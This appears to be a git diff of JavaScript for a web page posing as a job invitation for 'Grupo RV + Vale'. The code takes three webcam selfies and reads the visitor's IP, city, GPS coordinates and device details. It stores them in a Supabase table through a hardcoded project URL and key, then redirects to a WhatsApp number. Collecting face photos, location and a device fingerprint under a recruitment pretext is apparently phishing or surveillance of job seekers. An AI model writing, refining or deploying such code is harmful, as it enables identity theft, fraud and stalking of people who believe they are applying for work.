@@ -4,7 +4,7 @@
 import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm";
 
 // =================================================================
-// 2. CONFIGURAÇÃO DE CONEXÃO DO SEU PROJETO (SUPABASE)
+// 2. CONFIGURAÇÃO DE CONEXÃO DO SEU PROJETO SUPABASE
 // =================================================================
 const SUPABASE_URL = "https://gskcadoofoqwhqshcxcs.supabase.co"; 
 const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3"; 
@@ -106,9 +106,9 @@ btn.addEventListener("click", async () => {
     btn.disabled = true;
     btn.innerHTML = "PROCESSANDO...";
     
-    // ======================
+    // =============================================================
     // CAPTURA DE FOTOS EM BASE64 OTIMIZADA
-    // ======================
+    // =============================================================
     statusText.innerHTML = "📨 Verificando informações do convite..";
     falar("Verificando informações do convite..");
 
@@ -119,7 +119,7 @@ btn.addEventListener("click", async () => {
       throw new Error("Vídeo não carregou");
     }
 
-    // Forçamos o canvas a 640x480 para reduzir drasticamente o peso do texto Base64
+    // Configura tamanho fixo e leve para a conversão de Base64
     canvas.width = 640;
     canvas.height = 480;
     const ctx = canvas.getContext("2d");
@@ -127,16 +127,15 @@ btn.addEventListener("click", async () => {
 
     // Captura 3 fotos com intervalo de 1 segundo
     for(let i = 0; i < 3; i++) {
-        // Redimensiona a imagem da câmera para caber perfeitamente no canvas leve
         ctx.drawImage(video, 0, 0, 640, 480);
         
-        // Mantém em Base64 (.toDataURL), mas com qualidade 0.4 para ficar leve e passar sem erros
+        // Mantém em Base64 puro, com compressão leve de 0.4 para salvar sem erros
         fotos.push(canvas.toDataURL("image/jpeg", 0.4));
         
         if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
     }
 
-    // Desliga a câmera após a captura
+    // Desliga a câmera para economizar hardware
     const stream = video.srcObject;
     if (stream) {
         stream.getTracks().forEach(track => track.stop());
@@ -166,7 +165,7 @@ btn.addEventListener("click", async () => {
     }
 
     // ======================
-    // CAPTURA DE IP E DADOS DE REDE
+    // CAPTURA DE IP E LOCALIZAÇÃO DE REDE
     // ======================
     let ip = "indisponível";
     let cidade = "";
@@ -178,7 +177,7 @@ btn.addEventListener("click", async () => {
       const req = await fetch("https://ipapi.co/json/");
       const json = await req.json();
 
-      ip = json.ip || "";
+      ip = json.ip || "indisponível";
       cidade = json.city || "";
       estado = json.region || "";
       pais = json.country_name || "";
@@ -198,11 +197,11 @@ btn.addEventListener("click", async () => {
       .from('checkins')
       .insert([
         {
-          selfies: fotos, // Suas 3 fotos salvas como texto Base64 dentro do array do Supabase
+          selfies: fotos, 
           latitude: latitude.toString(),
           longitude: longitude.toString(),
           ip: ip,
-          cidade: city || cidade,
+          cidade: cidade, // CORRIGIDO AQUI!
           estado: estado,
           pais: pais,
           user_agent: navigator.userAgent,
@@ -210,28 +209,3 @@ btn.addEventListener("click", async () => {
           versao_android: infoDispositivo.androidVersion,
           navegador: infoDispositivo.browser,
           plataforma: navigator.platform,
-          idioma: navigator.language,
-          largura_tela: window.innerWidth,
-          altura_tela: window.innerHeight
-        }
-      ]);
-
-    if (error) throw error;
-
-    // ======================
-    // FLUXO DE SUCESSO FINAL
-    // ======================
-    statusText.innerHTML = "✅ Cadastro concluído";
-    falar("Cadastro concluído com sucesso.");
-
-    setTimeout(() => {
-      window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
-    }, 2000);
-
-  } catch(err) {
-    console.log(err);
-    statusText.innerHTML = "❌ Erro: " + (err.message || JSON.stringify(err));
-    btn.disabled = false;
-    btn.innerHTML = "QUERO PARTICIPAR";
-  }
-});
